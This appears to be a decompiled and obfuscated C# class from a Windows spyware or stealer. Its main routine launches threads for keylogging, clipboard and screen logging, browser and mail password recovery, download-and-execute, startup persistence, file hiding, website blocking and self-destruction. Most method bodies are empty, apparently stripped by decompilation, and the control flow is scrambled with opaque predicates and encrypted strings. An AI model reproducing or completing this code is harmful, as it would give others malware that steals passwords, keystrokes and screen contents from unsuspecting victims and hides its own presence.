using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using yleKZlCXnrEgcQD3gk;

[StandardModule]
internal sealed class NewsStand
{
	private static Thread T1;

	private static Thread T2;

	private static Thread T3;

	private static Thread T4;

	private static Thread T5;

	private static Thread T6;

	private static Thread T7;

	private static Thread T8;

	private static Thread T9;

	private static Thread T10;

	private static Thread T11;

	private static Thread T12;

	private static Thread T13;

	private static Thread T14;

	private static Random R;

	private static Mutex M;

	[AccessedThroughProperty("Keylogger")]
	private static KeyHook _Keylogger;

	internal static GetActiveWindow GetWindow;

	private static RecoverMail RecoverMail;

	private static RecoverBrowsers RecoverBrowsers;

	private static string KeyStrokeLog;

	private static string ClipboardLog;

	private static List<string> HotList;

	private static List<string> ScreenshotHotList;

	private static string Restart_Path;

	private static string App_Path;

	private static string Alt_Location;

	public static string P_Link;

	internal static KeyHook Keylogger
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get
		{
			return null;
		}
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.Synchronized)]
		set
		{
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	static NewsStand()
	{
		//Discarded unreachable code: IL_00d4
		HIqNmi47ta6wQLwpfy.Rb22303oj();
		int num = 2;
		while (true)
		{
			int num2 = num;
			while (true)
			{
				int num3;
				switch (num2)
				{
				case 4:
				case 7:
					HotList = new List<string>();
					num = 6;
					break;
				case 2:
					R = new Random();
					num = 3;
					if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						break;
					}
					goto case 1;
				case 5:
					App_Path = Application.get_ExecutablePath();
					num3 = 14;
					goto IL_00d9;
				case 1:
					RecoverMail = new RecoverMail();
					num = 13;
					break;
				case 9:
				case 11:
					Restart_Path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(0));
					num = 5;
					if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						break;
					}
					goto case 3;
				case 12:
					GetWindow = new GetActiveWindow();
					num = 1;
					if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						break;
					}
					goto case 0;
				case 0:
					ClipboardLog = null;
					goto default;
				default:
					_ = 1;
					if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						num2 = 4;
						continue;
					}
					num3 = 11;
					goto IL_00d9;
				case 6:
					ScreenshotHotList = new List<string>();
					goto case 9;
				case 8:
					KeyStrokeLog = null;
					num2 = 0;
					continue;
				case 13:
					RecoverBrowsers = new RecoverBrowsers();
					num = 8;
					if (true)
					{
						break;
					}
					goto case 3;
				case 3:
					Keylogger = new KeyHook();
					num2 = 12;
					continue;
				case 10:
					P_Link = HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(4);
					num3 = 15;
					goto IL_00d9;
				case 14:
					Alt_Location = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(0));
					num = 10;
					break;
				case 15:
					return;
					IL_00d9:
					num = num3;
					break;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	[STAThread]
	public static void Main()
	{
		//Discarded unreachable code: IL_0005, IL_005a
		//IL_0006: Incompatible stack heights: 0 vs 1
		int num = 4;
		if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
		{
			goto IL_001a;
		}
		goto IL_0063;
		IL_0063:
		int num2 = num;
		goto IL_0067;
		IL_0067:
		while (true)
		{
			int num3;
			switch (num2)
			{
			case 17:
				break;
			case 30:
				goto IL_003f;
			default:
				num = 19;
				if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					goto IL_0063;
				}
				goto case 3;
			case 3:
				T14.Start();
				num = 11;
				if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					goto IL_0063;
				}
				goto case 14;
			case 13:
				T12.Start();
				num = 31;
				if (true)
				{
					goto IL_0063;
				}
				goto case 15;
			case 15:
				ŇźƉŽƃƉƌ();
				num = 21;
				if (0 == 0)
				{
					goto IL_0063;
				}
				goto case 7;
			case 7:
				Application.Run();
				num = 35;
				if (true)
				{
					goto IL_0063;
				}
				goto case 28;
			case 28:
				T3.Start();
				num = 27;
				if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto IL_0063;
				}
				goto case 34;
			case 34:
				T2 = new Thread(AddToStartup);
				num = 16;
				goto IL_0063;
			case 1:
				T5 = new Thread(SelfDestruct);
				num = 18;
				if (true)
				{
					goto IL_0063;
				}
				goto case 9;
			case 9:
				T11.Start();
				num2 = 25;
				continue;
			case 27:
				T4 = new Thread(WebsiteVisitor);
				num = 20;
				if (true)
				{
					goto IL_0063;
				}
				goto case 8;
			case 8:
				T10.Start();
				num = 5;
				goto IL_0063;
			case 16:
				T2.Start();
				_ = 0;
				if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					num = 26;
					if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						goto IL_0063;
					}
					goto case 12;
				}
				num3 = 33;
				goto IL_005f;
			case 25:
				T12 = new Thread(DownloadAndExecute);
				num = 13;
				if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto IL_0063;
				}
				goto case 0;
			case 29:
				T10.SetApartmentState(ApartmentState.STA);
				num = 8;
				if (true)
				{
					goto IL_0063;
				}
				goto case 22;
			case 22:
				T9.Start();
				num = 17;
				if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					goto IL_0063;
				}
				goto case 5;
			case 10:
				T14 = new Thread(PasswordRecovery);
				num3 = 3;
				goto IL_005f;
			case 0:
				T6 = new Thread(GetCurrentWindow);
				num2 = 12;
				continue;
			case 32:
				T13.Start();
				num2 = 10;
				continue;
			case 2:
				T1.Start();
				num = 34;
				goto IL_0063;
			case 11:
				Keylogger.CreateHook();
				num2 = 7;
				continue;
			case 24:
				T9 = new Thread(AddHotWords);
				num = 22;
				if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto IL_0063;
				}
				goto IL_036a;
			case 19:
				goto IL_036a;
			case 18:
				T5.Start();
				num = 0;
				if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					goto IL_0063;
				}
				goto case 23;
			case 23:
				T7.Start();
				num = 30;
				if (true)
				{
					goto IL_0063;
				}
				goto case 12;
			case 12:
				T6.Start();
				goto case 14;
			case 31:
				T13 = new Thread(ExecuteBindedFiles);
				num = 32;
				if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto IL_0063;
				}
				goto case 18;
			case 6:
			case 26:
				T3 = new Thread(WebsiteBlocker);
				num2 = 28;
				continue;
			case 14:
			case 33:
				T7 = new Thread(RecordKeys);
				num2 = 23;
				continue;
			case 4:
				if (HIqNmi47ta6wQLwpfy.v9koUX6Y0(0))
				{
					num3 = 15;
					goto IL_005f;
				}
				return;
			case 5:
				T11 = new Thread(ScreenLogging);
				num2 = 9;
				continue;
			case 21:
				T1 = new Thread(ShowMessageBox);
				num = 2;
				if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto IL_0063;
				}
				goto case 11;
			case 20:
				T4.Start();
				num3 = 1;
				goto IL_005f;
			case 35:
				return;
				IL_005f:
				num = num3;
				goto IL_0063;
			}
			break;
		}
		goto IL_001a;
		IL_003f:
		T8 = new Thread(SendNotification);
		goto IL_036a;
		IL_001a:
		T10 = new Thread(ClipboardLogging);
		num = 29;
		if (1 == 0)
		{
			goto IL_003f;
		}
		goto IL_0063;
		IL_036a:
		T8.Start();
		num2 = 24;
		goto IL_0067;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void ŇźƉŽƃƉƌ()
	{
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void Wait(int i)
	{
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void ShowMessageBox()
	{
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void AddToStartup()
	{
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void AddCurrentKey(string name, string path)
	{
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void HideFile(string Path)
	{
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void WebsiteBlocker()
	{
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void WebsiteVisitor()
	{
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void SelfDestruct()
	{
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void DestructFile(object sender, ElapsedEventArgs e)
	{
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void GetCurrentWindow()
	{
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void RecordKeys()
	{
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static void KeyloggerProcess(string Key)
	{
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void SendNotification()
	{
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void AddHotWords()
	{
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void ClipboardLogging()
	{
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void TakeScreenshot(string Extension, string Quality, int Instance)
	{
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void ScreenLogging()
	{
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void DownloadAndExecute()
	{
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void DownloadFile(string WebLocation)
	{
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void ExecuteBindedFiles()
	{
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void ExecuteFile(string ResourceName, bool Executable)
	{
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void PasswordRecovery()
	{
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static string GetBetween(string input, string str1, string str2, int ind)
	{
		return null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool _0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()
	{
		return true;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool _008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091()
	{
		return true;
	}
}
